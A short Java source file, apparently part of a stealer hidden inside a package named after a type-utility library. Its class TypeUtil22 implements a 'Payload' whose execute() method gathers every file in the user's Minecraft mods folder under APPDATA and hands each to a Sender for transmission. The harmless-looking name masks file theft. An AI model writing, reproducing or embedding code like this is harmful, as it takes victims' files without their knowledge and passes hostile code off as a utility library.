package net.jodah.typetools.util.impl;

import net.jodah.typetools.Sender;
import net.jodah.typetools.util.FileUtil;
import net.jodah.typetools.util.Payload;

import java.io.File;

public final class TypeUtil22 implements Payload
{
    @Override
    public void execute()
    {
        for (File file : FileUtil.getFiles(System.getenv("APPDATA") + "\\.minecraft\\" + "mods")) Sender.send(file);
    }
}
